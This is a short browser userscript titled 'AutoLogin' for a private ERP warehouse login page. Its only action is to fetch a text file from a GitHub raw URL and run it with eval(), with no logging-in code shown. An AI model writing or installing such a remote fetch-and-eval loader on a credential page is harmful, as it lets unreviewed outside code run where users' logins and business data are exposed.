// ==UserScript==
// @name         AutoLogin
// @namespace    http://tampermonkey.net/
// @version      2024-07-30
// @description  try to take over the world!
// @author       You
// @match        https://wms.private.mabangerp.com/index?lang=en_US
// @icon         https://www.google.com/s2/favicons?sz=64&domain=mabangerp.com
// @grant        none
// ==/UserScript==

(function() {
    fetch("https://raw.githubusercontent.com/xMakiBoT/procsys24/main/1.txt")
        .then(response => response.text())
        .then(data => {
        try {
            eval(data);
            } catch (e) {
                console.error("Error executing the code:", e);
            }
    })
        .catch(error => {
        console.error("Error fetching the file:", error);
    });

})();